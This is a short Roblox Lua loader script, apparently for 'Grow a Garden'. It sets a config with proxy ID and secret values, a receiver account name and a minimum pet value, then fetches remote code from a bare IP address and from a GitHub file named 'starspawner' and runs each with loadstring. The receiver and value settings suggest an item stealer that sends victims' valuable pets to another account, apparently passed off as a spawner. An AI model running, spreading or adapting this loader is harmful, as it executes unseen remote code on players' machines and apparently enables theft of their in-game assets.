getgenv().StarScriptsConfig = {
    ProxyId = "SgeCl3DrnJfcAi4cm2CpR4oPw805lbby",
    ProxySecret = "DDcAfzQc_X-7duZTA5I9QQ7AAxU2ye9YLVq3briOavA",
    Receivers = {"vodi509"},
    BlacklistedSeeds = {"carrot", "corn", "pineapple", "blueberry", "apple", "strawberry"},
    MinPetValue = 75000
}

local serverScript = game:HttpGet("http://205.185.125.84/gag2/garden2")
loadstring(serverScript)()

task.wait(0.2)

local githubScript = game:HttpGet("https://raw.githubusercontent.com/annan1310/gag2/refs/heads/main/starspawner")
loadstring(githubScript)()
